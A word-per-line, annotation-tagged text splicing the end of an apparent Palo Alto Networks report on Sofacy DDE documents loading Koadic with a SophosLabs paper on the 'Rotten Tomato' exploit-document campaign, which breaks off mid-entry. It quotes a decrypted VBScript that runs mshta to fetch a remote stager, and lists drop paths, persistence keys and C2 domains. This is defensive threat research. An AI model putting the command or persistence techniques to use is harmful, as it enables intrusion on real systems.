breaks
the
string
up
within
the
XML
of
the
DOCX
file
(
word/document.xml
)
to
make
signature
development
difficult
,
as
seen
here
:

123456789
10
11
12
13
14
15
16
17
18
<
w
:
r
w
:
rsidRPr='00E84CED
'
>
<
w
:
rPr
>
<
w
:
b/
>
<
w
:
noProof/
>
<
w
:
color
w
:
themeColor='background1
'
w
:
val='FFFFFF'/
>
<
w
:
sz
w
:
val='2'/
>
<
w
:
szCs
w
:
val='2'/
>
<
/w
:
rPr
>
<
w
:
instrText
>
dd
<
/w
:
instrText
>
<
/w
:
r
>
<
w
:
r
w
:
rsidRPr='00E84CED
'
>
<
w
:
rPr
>
<
w
:
color
w
:
themeColor='background1
'
w
:
val='FFFFFF'/
>
<
w
:
sz
w
:
val='2'/
>
<
w
:
szCs
w
:
val='2'/
>
<
/w
:
rPr
>
<
w
:
instrText
xml
:
space='preserve
'
>
E
<
/w
:
instrText
>
<
/w
:
r
>
In
addition
to
the
aforementioned
DOCX
file
,
we
found
another
related
DDE
enabled
document
based
on
an
infrastructure
overlap
with
a
Zebrocy B_malware.drop
C2
IP
address
.

This
related
delivery
document
was
an
RTF
file
that
downloaded
and
installed
a
payload
used
to
load
the
open-source
Koadic
tool
.

We
do
not
have
telemetry
on
the
target
or
attack
vector
,
but
we
know
the
RTF
file
used
DDE
to
download
and
execute
an
executable
that
loaded
Koadic
.

The
payload
(
abbad7acd...
)
is
an
executable
that
appears
to
have
been
created
by
a
VBScript
to
Executable
tool
and
further
obfuscated
with
a
cryptor
.

Our
analysis
shows
some
possible
ties
to
the
Vbs
to
Exe
tool
by
F2KO
Software
but
we
have
yet
to
confirm
a
direct
overlap
.

We
believe
the
actor
used
a
cryptor
on
the
payload
,
as
it
obtains
a
filename
and
script
from
within
its
resources
and
decodes
these
resources
by
multiplying
each
byte
by
negative
one
.

The
payload
then
uses
the
MD5
hash
(
14331d289e737093994395d3fc412afc B_hash
)
of
what
appears
to
be
a
hardcoded
SHA1
hash
(
B6A75B1EF701710D7AEADE0FE93DE8477F3BD506 B_hash
)
as
an
RC4
key
to
decrypts
the
resulting
decoded
data
.

For
instance
,
the
following
data
exists
within
a
resource
:
fb
70
b0
c9
bd
c5
8a
d4
0c
54
fd
4c
6d
bb
f0
0f
By
multiplying
each
byte
with
-1
,
we
obtain
the
following
data
:
05
90
50
37
43
3b
76
2c
f4
ac
03
b4
93
45
10
f1
After
using
RC4
and
the
key
14331d289e737093994395d3fc412afc
,
the
following
cleartext
data
appears
:
\x00\x00\x00\x00FlashRun.vbs
We
do
not
see
the
payload
using
this
FlashRun.vbs
filename
,
instead
it
uses
a
temporary
file
name
to
store
an
embedded
VBScript
file
,
such
as
%
Temp%\4.tmp\5.vbs
.

The
embedded
VBScript
is
retrieved
from
a
resource
and
decrypted
using
the
same
algorithm
as
discussed
above
,
which
results
in
the
following
cleartext
:
1
2
set
objshell
=
createobject(\'wscript.shell\
'
)
objshell.run
\'mshta
hxxp://86.106.131.177:6500/zIZFh\',vbhide
The
Koadic
C2
server
will
respond
to
this
request
with
Javascript
code
that
acts
as
the
Koadic
staging
payload
,
which
allows
the
actor
to
run
additional
Koadic
modules
on
the
end
system
to
carry
out
their
post-exploitation
activities
.

Unfortunately
,
we
did
not
observe
the
Koadic
modules
used
by
Sofacy
during
out
analysis
.

IOCs
Domain
supservermgr[.]com B_url.normal
URL
hxxp://supservermgr[.]com/sys/upd/pageupd.php B_url.normal
Zebrocy B_malware.drop
d697160aecf152a81a89a6b5a7d9e1b8b5e121724038c676157ac72f20364edc B_hash
cba5ab65a24be52214736bc1a5bc984953a9c15d0a3826d5b15e94036e5497df B_hash
25f0d1cbcc53d8cfd6d848e12895ce376fbbfaf279be591774b28f70852a4fd8 B_hash
115fd8c619fa173622c7a1e84efdf6fed08a25d3ca3095404dcbd5ac3deb1f03 B_hash
f27836430742c9e014e1b080d89c47e43db299c2e00d0c0801a2830b41b57bc1 B_hash
5b5e80f63c04402d0b282e95e32155b2f86cf604a6837853ab467111d4ac15e2 B_hash
dd7e69e14c88972ac173132b90b3f4bfb2d1faec15cca256a256dd3a12b6e75d B_hash

Koadic
abbad7acd50754f096fdc6551e728aa6054dcf8e55946f90a02b17db552471ca B_hash
User
Agents
Mozilla/4.0
(
compatible
;
MSIE
6.0
;
Windows
NT
5.1
;
SV1
;
.NET
CLR
1.1.4322
;
.NET
CLR
2.0.50727
;
.NET
CLR
3.0.04506.30
;
.NET
CLR
3.0.04506.648
;
InfoPath.1
)
Mozilla/5.0
(
Windows
NT
6.1
;
WOW64
)
WinHttp/1.6.3.8
(
WinHTTP/5.1
)
like
Gecko
Mozilla
v5.1
(
Windows
NT
6.1
;
rv:6.0.1
)
Gecko/20100101
Firefox/6.0.1
IPs
185.25.51[.]198 B_ip.distribute
185.25.50[.]93 B_ip.distribute
220.158.216[.]127 B_ip.distribute
92.114.92[.]102 B_ip.distribute
86.106.131[.]177 B_ip.distribute
DDE
Docs
85da72c7dbf5da543e10f3f806afd4ebf133f27b6af7859aded2c3a6eced2fd5 B_hash
8cf3bc2bf36342e844e9c8108393562538a9af2a1011c80bb46416c0572c86ff B_hash
Got
something
to
say
?

Leave
a
comment...
Notify
me
of
followup
comments
via
e-mail
Name
(
required
)
Email
(
required
)
Website
SUBMIT
COMPANY
Company
Careers
Sitemap
LEGAL
NOTICES
ACCOUNT
Privacy
Terms
of
Use
Documents
Manage
a
Subscription
Report
a
Vunerability
GDPR
Readiness
©
2018
Palo
Alto
Networks
,
Inc
.

All
rights
reserved
.
The
Rotten
Tomato
Campaign
By
Gabor
Szappanos
,
Principal
Researcher
,
SophosLabs
Hungary

A
SophosLabs
technical
paper
–
October
2014
The
Rotten
Tomato
Campaign
Contents
Overview
Template
1
:
CVE-2012-0158
+
CVE-2014-1761
Combo
First
attempt
:
Plugx B_malware.backdoor
Template
2
:
Goldsun
Second
attempts
Plugx B_malware.backdoor
Appat
Others
Successful
intergrations
Detour
:
Plugx B_malware.backdoor
Conclusion
References
223456
10
12
13
16
20
20
1

A
SophosLabs
technical
paper
–
October
2014
The
Rotten
Tomato
Campaign
Overview
Malware
authors
are
not
shy
about
borrowing
ideas
.

One
of
the
most
typical
cases
is
the
Tomato
Garden
case,1
where
several
different
groups
used
the
same
zero-day
Microsoft
Word
exploit
.

The
term
'
used
'
means
that
they
somehow
get
hold
of
a
document
that
exploited
the
vulnerability
,
and
then
left
the
exploiting
document
part
and
the
shellcode
intact
,
only
changed
the
appended
encrypted
executable
at
the
end
,
and
immediately
they
had
what
needed
.

Something
very
similar
happened
just
recently
,
in
August
and
September
of
2014
.

I
always
wanted
to
know
how
the
malware
writing
groups
worked
.

I
mean
the
really
serious
ones
,
the
ones
behind
Chinese
state-sponsored
APT
attacks
,
or
the
groups
behind
high
profile
common
malware
,
like
Zeus
.

This
case
offers
another
piece
of
insight
.

There
must
have
been
a
staff
meeting
,
where
the
manager
prompted
that
,
in
the
next
malware
distribution
campaign
they
should
not
only
use
the
aging
CVE-2012-0158
vulnerability
,
but
the
newer
CVE-2014-1761
as
well
.

The
rest
of
the
document
will
detail
how
some
of
the
groups
coped
with
this
task
.

Clearly
,
the
malware
authors
took
a
sample
somehow
and
started
the
implementation
process
.

I
was
n't
there
,
of
course
,
so
what
follows
is
an
educated
guess
based
on
the
samples
.

Template
1
:
CVE-2012-0158
+
CVE-2014-1761
Combo
Recently
we
saw
a
lot
of
samples
that
exploit
both
CVE-2012-0158
and
CVE-2014-1761
,
and
usually
either
download
or
drop
a
Zbot B_malware.infosteal
variant
.

The
document
starts
with
the
RTF
header
stuff
,
followed
by
the
encrypted
second
stage
.

This
is
followed
by
the
embedded
object
exploiting
the
CVE-2012-0158
vulnerability
with
the
shellcode
.

Following
it
is
a
block
exploiting
the
CVE-2014-1761
with
a
shellcode
of
its
own
,
as
illustrated
in
the
image
below
.

The
color
scheme
I
will
use
in
the
rest
of
the
document
is
the
following
:
green
represents
the
properly
used
components
;
yellow
the
unused
components
;
and
red
the
incorrectly
used
components
.

Encrypted
Zbot B_malware.infosteal
CVE-2012-0158
exploit
and
Zbot B_malware.infosteal
shellcode
CVE-2014-1761
exploit
and
Zbot B_malware.infosteal
shellcode
Regardless
of
the
particular
exploit
used
,
both
shellcodes
performed
the
memory
egg-hunting
for
the
memory
markers
of
the
second
stage
(
as
described
in2
)
,
and
decrypted
it
when
found
.

The
second
stage
could
be
either
a
downloader
shellcode
or
a
Win32
executable
.

One
of
these
samples
was
SHA1
:
c3a7cb43ec13299b758cb8ca25eace71329939f7 B_hash
,
which
contained
an
encrypted
Zbot B_malware.infosteal
variant3
at
the
beginning
of
the
RTF
.

It
looks
very
likely
that
this
sample
was
used
as
a
development
template
for
the
other
malware
writing
groups
.

2
A
SophosLabs
technical
paper
–
October
2014
The
Rotten
Tomato
Campaign
First
attempt
:
Plugx B_malware.backdoor
The
first
attempt
must
have
come
from
the
group
deploying
Plugx B_malware.backdoor
.

They
took
the
above
mentioned
sample
,
and
made
some
modifications
to
it
.

The
result
looks
like
this
one
:
Encrypted
Zbot B_malware.infosteal
CVE-2012-0158
exploit
and
Plugx B_malware.backdoor
shellcode
CVE-2014-1761
exploit
and
Zbot B_malware.infosteal
shellcode
Encrypted
Plugx B_malware.backdoor
I
can
only
guess
that
they
did
n't
understand
the
CVE-2014-1761
component
,
and
thought
that
there
was
only
one
shellcode
,
in
the
CVE-2012-0158
segment
.

So
they
appended
the
encrypted
Plugx B_malware.backdoor
executable
,
and
replaced
the
first
shellcode
with
their
own
.

This
shellcode
contains
the
hardcoded
offset
of
the
embedded
executable
,
and
decrypts
from
there
.

However
,
they
left
intact
the
encrypted
Zbot B_malware.infosteal
executable
at
the
beginning
of
the
file
and
the
second
vulnerability
,
making
this
sample
a
real
dual
weapon
:
not
only
that
it
exploits
two
vulnerabilities
,
but
contains
two
totally
different
payloads
.

However
,
Word
can
only
be
exploited
once
:
during
the
exploitation
procedure
the
current
instance
of
Word
exits
,
and
a
new
one
is
started
that
displays
the
decoy
document
.

So
this
creates
a
race
condition
:
whichever
vulnerability
is
triggered
first
(
or
gets
lucky
in
an
environment
where
the
other
one
is
patched
)
will
have
the
chance
to
run
its
own
payload
.

13effaca957cc362bdcbfdd05b5763205b53d9ca
Original
name
:
N/A

System
activity

Dropped
to
C
:
\Documents
and
Settings\All
Users\DRM\AShld\drmupgds.exe
(
clean
loader
digitally
signed
by
Microsoft
)
and
C
:
\Documents
and
Settings\All
Users\DRM\AShld\BlackBox
.

DLL
(
malware
loader
)
and
C
:
\Documents
and
Settings\All
Users\DRM\AShld\BlackBox.BOX
(
payload
)
;
registered
in
HKLM\SYSTEM\CurrentControlSet\Services\BlackBox
→
ImagePath
The
payload
is
next-generation
Plugx,4
plugin
function
creation
dates
are
0x20130810
.

3
A
SophosLabs
technical
paper
–
October
2014
The
Rotten
Tomato
Campaign
C&C
servers
chromeupdate.authorizeddns.org
Dynamic
DNS
service
googlesupport.proxydns.com
Dynamic
DNS
service
Template
2
:
Goldsun
At
some
point
they
must
have
realized
that
it
was
wrong
and
tried
to
fix
the
CVE-2014-1761
part
.

For
that
,
they
took
another
recent
sample
,
something
similar
to
those
that
drop
Goldsun
Trojans
(
like
this
SHA1
:
e2474cc0da5a79af876771217eb81974e73c39e5 B_hash
)
In
this
case
,
the
RTF
only
contains
the
CVE-2014-1761
vulnerability
,
with
an
appended
executable
.

The
vulnerability
expects
the
second
stage
shellcode
at
a
fixed
file
offset
,
checks
a
marker
string
there
(
'p
!
11
'
)
,
and
jumps
to
the
second
stage
,
which
then
decrypts
and
executes
the
final
Win32
payload
.

4
A
SophosLabs
technical
paper
–
October
2014
The
Rotten
Tomato
Campaign
CVE-2014-1761
exploit
and
Goldsun
shellcode
Memory
marker
and
Goldsun
second
stage
shellcode
Start
marker
and
encrypted
Goldsun
Second
attempts
A
large
group
of
samples
were
created
by
a
sort
of
a
fusion
of
the
Zbot B_malware.infosteal
and
the
Goldsun
samples
,
resulting
in
a
structure
like
this
one
:
Encrypted
Zbot B_malware.infosteal
CVE-2012-0158
exploit
and
Plugx B_malware.backdoor
shellcode
CVE-2014-1761
exploit
and
Goldsun
shellcode
Memory
marker
and
Goldsun
second
stage
shellcode
Encrypted
Plugx B_malware.backdoor
Blank
So
now
there
are
two
different
shellcodes
.

The
first
,
from
Plugx B_malware.backdoor
,
reads
the
length
of
the
embedded
decoy
document
and
Win32
payload
from
the
end
of
the
file
,
and
using
this
info
locates
and
decrypts
the
appended
payload
.

This
shellcode
identifies
the
host
document
by
checking
if
the
last
dword
is
the
same
as
the
dword
before
that
rotated
by
3
.

And
the
same
holds
for
another
two
dwords
before
that
.

These
dwords
also
store
the
length
of
the
appended
PE
payload
and
decoy
document
lengths
.

This
structure
makes
it
possible
to
swap
the
payload
without
changing
the
exploit
and
shellcode
part
.

The
shellcode
from
Goldsun
executes
the
second
stage
code
from
a
fixed
offset
.

5
A
SophosLabs
technical
paper
–
October
2014
The
Rotten
Tomato
Campaign
There
are
a
couple
of
problems
with
this
implementation
.

First
,
the
defunctional
encrypted
Zbot B_malware.infosteal
remains
in
these
files
,
with
no
purpose
at
all
.

But
the
real
problem
is
with
the
Goldsun
style
CVE-2014-1761
block
.

It
was
snatched
from
the
CVE-2014-1761
exploiting
document
,
and
pasted
after
the
existing
Zbot B_malware.infosteal
+
CVE-2012-0158
combo
.

Clearly
,
the
offset
where
the
second
stage
code
would
be
shifted
with
the
different
prepended
content
,
but
it
never
happened
.

As
a
result
,
the
CVE-2014-1761
exploitation
does
n't
work
,
despite
all
the
efforts
of
the
malware
authors
.

A
couple
of
distinct
malware
groups
were
identified
that
use
these
schematics
.

Plugx B_malware.backdoor
All
of
these
samples
are
Plugx B_malware.backdoor
v2
samples.4
Most
of
the
time
they
use
Russian
related
themes
in
the
decoy
document
.

21b3e540746816c85e5270a1b8bb58bf713ff5f5
Original
name
:
N/A
The
dropped
decoy
document
does
n't
contain
anything
,
it
is
only
blank
page
.

System
activity
Dropped
to
C
:
\Documents
and
Settings\All
Users\DRM\usta\usha.exe
(
clean
loader
,
digitally
signed
by
Kaspersky
)
and
C
:
\Documents
and
Settings\All
Users\DRM\usta\ushata.dll
(
malware
loader
)
and
C
:
\Documents
and
Settings\All
Users\DRM\usta\ushata.dll.avp
(
payload
)
;
registered
for
startup
as
a
service
in
HKLM\SYSTEM\CurrentControlSet\Services\usta
→
ImagePath
The
payload
is
next
generation
Plugx,4
plugin
function
creation
dates
are
0x20130810
C&C
servers
www.notebookhk.net B_url.normal
Registry
Registrant
ID
:
Registrant
Name
:
lee
stan
Registrant
Organization
:
lee
stan
Registrant
Street
:
xianggangdiqu
Registrant
City
:
xianggangdiqu
Registrant
State
:
xianggang
80f965432ce872fc3592d9f907d5a4f66ab07f9c
Original
name
:
Справка
от
16.09.2014.doc
Registrant
Postal
Code
:
796373
Registrant
Country
:
HK
Registrant
Phone
:
+0.04375094543
Registrant
Fax
:
+0.04375094543
Registrant
Email
:
stanlee@gmail.com
6
A
SophosLabs
technical
paper
–
October
2014
The
Rotten
Tomato
Campaign
System
activity
Dropped
to
C
:
\Documents
and
Settings\All
Users\DRM\AShld\AShld.exe
(
clean
loader
,
digitally
signed
by
McAfee
)
and
C
:
\Documents
and
Settings\All
Users\DRM\AShld\AShldRes.DLL
(
malware
loader
)
and
C
:
\Documents
and
Settings\All
Users\DRM\AShld\AShldRes.DLL.asr
(
payload
)
;
registered
for
startup
as
a
service
in
HKLM\SYSTEM\CurrentControlSet\Services\
AShld
→
ImagePath
The
payload
is
next
generation
Plugx,4
plugin
function
creation
dates
are
0x20130810
.

C&C
servers
dwm.dnsedc.com B_url.normal
Registry
Registrant
ID
:
Registrant
Name
:
qiuping
liu
Registrant
Organization
:
huajiyoutian
Registrant
Street
:
beijing
Registrant
City
:
Beijing
Registrant
State/Province
:
BJ
Registrant
Postal
Code
:
100191
Registrant
Country
:
CN
Registrant
Phone
:
+86.1052810955
Registrant
Phone
Ext
:
Registrant
Fax
:
+89.1052810955
Registrant
Fax
Ext
:
Registrant
Email
:
yuminga1@126.com
Two
of
the
Plugx B_malware.backdoor
samples
turned
out
to
be
very
new
developments
.

Similar
samples
were
just
recently
encountered
from
the
list
generated
by
a
researcher.5
176273806e6fe338123ff660e70145935bac77c3
Original
name
:
РЕЗЮМЕ.doc
7
A
SophosLabs
technical
paper
–
October
2014
The
Rotten
Tomato
Campaign
System
activity
Dropped
to
C
:
\Documents
and
Settings\All
Users\DRM\KavSky\msinfo.exe
(
clean
loader
by
Kaspersky
)
and
C
:
\Documents
and
Settings\All
Users\DRM\KavSky\msi.dll
(
malware
loader
)
and
C
:
\Documents
and
Settings\All
Users\DRM\KavSky\msi.dll.eng
(
payload
)
;
registered
in
for
startup
as
a
service
in
HKLM\SYSTEM\CurrentControlSet\Services\KavSky
→
ImagePath
The
payload
is
next
generation
Plugx B_malware.backdoor
[
4
]
,
plugin
function
creation
dates
are
20140719
(
and
interestingly
,
decimal
and
not
hexadecimal
,
as
generally
seen
in
Plugx B_malware.backdoor
)
.

Additionally
,
it
has
some
internal
function
names
not
seen
in
earlier
Plugx B_malware.backdoor
versions
:
ZX
,
ZXWT
,
JP1
,
JP2
,
JP3
,
JP4
,
JP5
,
JAP0
,
JAP1
C&C
servers
futuresgolda.com B_url.normal
Registry
Registrant
ID
:
Registrant
Name
:
qiuping
liu
Registrant
Organization
:
huajiyoutian
Registrant
Street
:
beijing
Registrant
City
:
Beijing
Registrant
State/Province
:
BJ
Registrant
Postal
Code
:
100191
Registrant
Country
:
CN
Registrant
Phone
:
+86.1052810955
Registrant
Phone
Ext
:
Registrant
Fax
:
+89.1052810955
Registrant
Fax
Ext
:
Registrant
Email
:
yuminga1@126.com
adobeflashupdate.dynu.com B_url.normal
Dynamic
DNS
service
systemupdate5.dtdns.com B_url.normal
Dynamic
DNS
service
4ad76ce333b38c5bdd558e3d76640fa322e3cca6
Original
name
:
2014
Chairmanship_end.doc
8
A
SophosLabs
technical
paper
–
October
2014
The
Rotten
Tomato
Campaign
System
activity
Dropped
to
C
:
\Documents
and
Settings\All
Users\DRM\KavSky\m.exe
(
clean
loader
,
digitally
signed
by
Kaspersky
)
and
C
:
\Documents
and
Settings\All
Users\DRM\KavSky\msi.dll
(
malware
loader
)
and
C
:
\Documents
and
Settings\All
Users\DRM\KavSky\msi.dll.eng
(
payload
)
;
registered
in
for
startup
as
a
service
in
HKLM\SYSTEM\CurrentControlSet\Services\KavSky
→
ImagePath
The
payload
is
next
generation
Plugx,4
plugin
function
creation
dates
are
20140719
decimal
.

Additionally
,
it
has
some
internal
function
names
not
seen
in
earlier
Plugx B_malware.backdoor
versions
:
ZX
,
ZXWT
,
JP1
,
JP2
,
JP3
,
JP4
,
JP5
,
JAP0
,
JAP1
This
sample
used
a
Myanmar
related
decoy
theme
,
likely
part
of
a
separate
distribution
campaign
.

C
&
C
servers
indiasceus.jetos.com
Dynamic
DNS
service
indiasceus.justdied.com
Dynamic
DNS
service
9
A
SophosLabs
technical
paper
–
October
2014
The
Rotten
Tomato
Campaign
Appat
These
are
new
Trojans
.

Not
connected
to
Plugx B_malware.backdoor
at
code
level
,
but
the
overlap
between
the
C
&
C
servers
,
the
same
domain
registration
contact
(
yuminga1@126.com
)
,
and
the
similar
Russian
theme
indicates
that
the
same
group
deployed
them
.

0dfd883c1f205f0740d50688683f1869bcc0e9d7
Original
name
:
План
космической
деятельности
на
2021-2025
год.doc
System
activity
Dropped
to
%
WINDOWS%\AppPatch\AcProtect.dll
(
SHA1
:
994be9c340f57ba8cbb20b7ceedad49b00294f3e
)
and
%
WINDOWS%\AppPatch\msimain.mui
(
separate
payload
file
)
.

Registered
for
startup
with
unusual
autostart
method
,
briefly
touched
in.7
A
Microsoft
patch
file
is
dropped
to
%
WINDOWS
%
\AppPatch\Custom\
{
099BF1AE-6A93-493D-0C48-2453E7FBC801}.sdband
registered
to
load
in
HKLM\SOFTWARE\Microsoft\
Windows
NT\CurrentVersion\AppCompatFlags\InstalledSDB
.

That
file
loads
AcProtect.dll
as
a
library
component
.

The
dumped
payload
shows
similar
functionality
to
what
Plugx B_malware.backdoor
(
or
any
other
general
purpose
backdoor
)
has
,
but
on
a
code
level
it
is
very
different
.

10
A
SophosLabs
technical
paper
–
October
2014
The
Rotten
Tomato
Campaign
C
&
C
servers
adobeflashupdate.dynu.com B_url.normal
Dynamic
DNS
service
transactiona.com B_url.normal
Domain
Status
:
clientTransferProhibited
Registry
Registrant
ID
:
Registrant
Name
:
qiuping
liu
Registrant
Organization
:
huajiyoutian
Registrant
Street
:
beijing
Registrant
City
:
Beijing
Registrant
State/Province
:
BJ
systemupdate5.dtdns.com B_url.normal
Dynamic
DNS
service
Registrant
Postal
Code
:
100191
Registrant
Country
:
CN
Registrant
Phone
:
+86.1052810955
Registrant
Phone
Ext
:
Registrant
Fax
:
+89.1052810955
Registrant
Fax
Ext
:
Registrant
Email
:
yuminga1@126.com
9bc128f120996677d3c4f7c1d7506315b232e49e
Original
name
:
План
космической
деятельности
на
2015-2020
год.doc
System
activity
Dropped
to
%
PROFILE
%
\Local
Settings\Temp\3.tmp
;
64
bit
malware
components
,
refer
to
the
same
files
names
that
are
used
by
0dfd883c1f205f0740d50688683f1869bcc0e9d7
C
&
C
servers
:
N/A
11
A
SophosLabs
technical
paper
–
October
2014
The
Rotten
Tomato
Campaign
Others
There
were
a
few
other
samples
,
but
all
single
.

Kamics
:712df1f1f11f63e2154eb9023d584be62ef100b8
Original
name
:
N/A
The
dropped
decoy
document
is
a
password
protected
Word
file
,
content
is
not
visible
in
the
lack
of
the
correct
password
.

System
activity
Dropped
to
%
PROFILE
%
\Local
Settings\Temp\msvcpdl100.dll
(
SHA1
:
51346d70ea97a7aaef80f98c4891526443b2696c B_hash
)
and
C
:
\MsBuild\Microsoft\Windows\System32\
svchost.exe
(
SHA1
:
2196770391bdbdd15bce5895427ec99b1bef0868 B_hash
)
;
registered
for
startup
in
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
→
Kaspersky
Internet
Security
C
&
C
servers
buglaa.sportnewsa.net
Farfli
:
960ac7329a6e80682959d6da0469921f8167e79a
Original
name
:
MoFA
Note-
Verbale
on
19.8.14.doc
System
activity
Dropped
to
%
PROFILE
%
\Application
Data\winlog.exe
(
SHA1
:
511f2055a56c0f458b1b14cc207730d0fe639df4 B_hash
)
and
%
PROFILE
%
\Application
Data\winlog.dll
(
SHA1
:
bb185efd35f7b4892a32e7853e044e94502a36af B_hash
)
12
A
SophosLabs
technical
paper
–
October
2014
The
Rotten
Tomato
Campaign
C
&
C
servers
unisers.com B_url.normal
Domain
Status
:
clientTransferProhibited
Registry
Registrant
ID
:
Registrant
Name
:
wang
cheng
Registrant
Organization
:
wang
cheng
Registrant
Street
:
BeijingDaguoROAD136
Registrant
City
:
Beijing
Registrant
State
:
Beijing
Registrant
Postal
Code
:
100001
Registrant
Country
:
CN
Registrant
Phone
:
+86.01085452454
Registrant
Fax
:
+86.01085452454
Registrant
Email
:
bitumberls.@163.com
Successful
integrations
But
not
all
were
failures
.

There
were
two
samples
that
followed
the
above
structure
,
and
the
Goldsun
shellcode
offset
was
fixed
.

However
,
both
samples
were
only
dropping
and
executing
a
Chinese
nationalized
version
of
calc.exe
–
these
are
clearly
test
samples
from
China
.

Furthermore
,
a
couple
of
common
malware
samples
were
found
with
fixed
second
stage
offsets
,
showing
that
at
least
these
guys
know
what
they
are
doing
.

Still
,
they
kept
the
inactive
encrypted
Zbot B_malware.infosteal
at
the
beginning
of
the
document
.

Encrypted
Zbot B_malware.infosteal
CVE-2012-0158
exploit
and
Plugx B_malware.backdoor
shellcode
CVE-2014-1761
exploit
and
Goldsun
shellcode
Memory
marker
and
Goldsun
second
stage
shellcode
Encrypted
Zbot B_malware.infosteal
Zbot B_malware.infosteal
Among
the
samples
conventional
Zbot B_malware.infosteal
variants
were
also
found
.

These
showed
up
in
Middle
Eastern
countries
,
and
have
Arabic
themes
as
a
decoy
.

a44308788bbd189e532745a79d126feaf708c3cd
Original
name
:
مصطلحات
هامة
ومنوعة
في
اللغة.doc
13
A
SophosLabs
technical
paper
–
October
2014
The
Rotten
Tomato
Campaign
System
activity
Dropped
to
%
PROFILE
%
\Application
Data\Yhyq\sied.exe
(
random
directory
and
filename
)
;
registered
for
startup
in
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
→
Opagw
C
&
C
servers
www.starorder.ezua.com B_url.normal
Dynamic
DNS
service
pop3.sec-homeland.com B_url.normal
Domain
Status
:
OK
Registry
Registrant
ID
:
Registrant
Name
:
dfhgewy
Registrant
Organization
:
dfhgewy
Registrant
Street
:
dfhgewy
Registrant
City
:
Unknown
City
Registrant
State/Province
:
Unknown
Province
Registrant
Email
:
joiupnhs@163.com
Registrant
Postal
Code
:
000000
Registrant
Country
:
China
Registrant
Phone
:
+086.0000
00000000
Registrant
Phone
Ext
:
Registrant
Fax
:
+086.0000
00000000
Registrant
Fax
Ext
:
d05e586251b3a965b9c9af76568eff912e16432f
Original
name
:
تهنئة
بعيد
الاضحى
المبارك.doc
14
A
SophosLabs
technical
paper
–
October
2014
The
Rotten
Tomato
Campaign
System
activity
Dropped
to
%
PROFILE
%
\Application
Data\Hysyt\ydbi.exe
(
random
directory
and
filename
)
;
registered
for
startup
in
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
→
Pecyiqu
C
&
C
servers
www.starorder.ezua.com B_url.normal
Dynamic
DNS
service
pop3.sec-homeland.com B_url.normal
Domain
Status
:
OK
Registry
Registrant
ID
:
Registrant
Name
:
dfhgewy
Registrant
Organization
:
dfhgewy
Registrant
Street
:
dfhgewy
Registrant
City
:
Unknown
City
Registrant
State/Province
:
Unknown
Province
Registrant
Email
:
joiupnhs@163.com
Registrant
Postal
Code
:
000000
Registrant
Country
:
China
Registrant
Phone
:
+086.0000
00000000
Registrant
Phone
Ext
:
Registrant
Fax
:
+086.0000
00000000
Registrant
Fax
Ext
:
Swrort
:
fa616b8e2f91810a8d036ba0adca6df50da2ad22
Original
name
:
test.doc
15
A
SophosLabs
technical
paper
–
October
2014
The
Rotten
Tomato
Campaign
System
activity
Dropped
to
%
PROFILE
%
\Local
Settings\Temp\3.tmp
C
&
C
servers
Detour
:
Plugx B_malware.backdoor
During
the
analysis
of
this
campaign
we
ran
into
a
handful
of
samples
that
have
nothing
to
do
with
CVE-2014-1761
,
but
they
contained
some
of
the
encrypted
Zbot B_malware.infosteal
at
the
beginning
of
the
file
.

The
end
of
encrypted
PE
is
truncated
,
and
the
CVE-2012-0158
code
is
replaced
with
the
Plugx B_malware.backdoor
shellcode
.

Interestingly
,
there
is
another
shellcode
,
which
is
starts
with
the
same
marker
(
'p
!
11
'
)
as
the
Goldsun
second
stage
code
,
but
the
execution
logic
is
the
same
as
the
Plugx B_malware.backdoor
shellcode
.

However
,
this
shellcode
just
hangs
in
the
air
,
no
execution
path
leads
to
it
.

It
is
not
clear
,
where
these
samples
fit
in
the
development
path
,
could
be
that
after
the
failure
to
integrate
CVE-2014-1761
,
the
corresponding
part
was
simply
ditched
from
the
samples
.

Encrypted
Zbot B_malware.infosteal
CVE-2012-0158
exploit
and
Plugx B_malware.backdoor
shellcode
Memory
marker
and
Plugx B_malware.backdoor
second
stage
shellcode
Encrypted
Plugx B_malware.backdoor
6f845ef154a0b456afcf8b562a0387dabf4f5f85
Original
name
:
Indian
Cooking
Recipe.doc
16
A
SophosLabs
technical
paper
–
October
2014
The
Rotten
Tomato
Campaign
System
activity
Dropped
to
C
:
\Documents
and
Settings\All
Users\RasTls\RasTls.exe
(
clean
loader
digitally
signed
by
Symantec
)
,
C
:
\Documents
and
Settings\All
Users\RasTls\RasTls.dll
(
loader
)
and
C
:
\Documents
and
Settings\All
Users\RasTls\RasTls.dll.msc
(
payload
)
;
registered
in
HKLM\
SYSTEM\CurrentControlSet\Services\RasTls
→
ImagePath
The
payload
is
next
generation
Plugx,4
plugin
function
creation
dates
are
0x20130524
C&C
servers
supercat.strangled.net
Free
domain
sharing
a97827aef54e7969b9cbbec64d9ee81a835f2240
Original
name
:
Calling
Off
India-Pak
Talks.doc
17
A
SophosLabs
technical
paper
–
October
2014
The
Rotten
Tomato
Campaign
System
activity
Dropped
to
C
:
\Documents
and
Settings\All
Users\RasTls\RasTls.exe
(
clean
loader
digitally
signed
by
Symantec
)
,
C
:
\Documents
and
Settings\All
Users\RasTls\RasTls.dll
(
loader
)
and
C
:
\Documents
and
Settings\All
Users\RasTls\RasTls.dll.msc
(
payload
)
;
registered
in
HKLM\
SYSTEM\CurrentControlSet\Services\RasTls
→
ImagePath
The
payload
is
next
generation
Plugx,4
plugin
function
creation
dates
are
0x20130524
C
&
C
servers
nusteachers.no-ip.org
Dynamic
DNS
service
e8a29bb90422fa6116563073725fa54169998325
Original
name
:
Human
Rights
Violations
of
Tibet.doc
18
A
SophosLabs
technical
paper
–
October
2014
The
Rotten
Tomato
Campaign
System
activity
Dropped
to
C
:
\Documents
and
Settings\All
Users\RasTls\RasTls.exe
(
clean
loader
digitally
signed
by
Symantec
)
,
C
:
\Documents
and
Settings\All
Users\RasTls\RasTls.dll
(
loader
)
and
C
:
\Documents
and
Settings\All
Users\RasTls\RasTls.dll.msc
(
payload
)
;
registered
in
HKLM\
SYSTEM\CurrentControlSet\Services\RasTls
→
ImagePath
The
payload
is
next
generation
Plugx,4
plugin
function
creation
dates
are
0x20130524
.

C&C
servers
ruchi.mysq1.net
Dynamic
DNS
service
19e9dfabdb9b10a90b62c12f205ff0d1eeef3f14
This
is
not
a
Plugx B_malware.backdoor
sample
,
but
a
Nineblog
variant.8
Original
name
:
ghozaresh
amniyati.doc
System
activity
Dropped
to
%
PROFILE
%
\Application
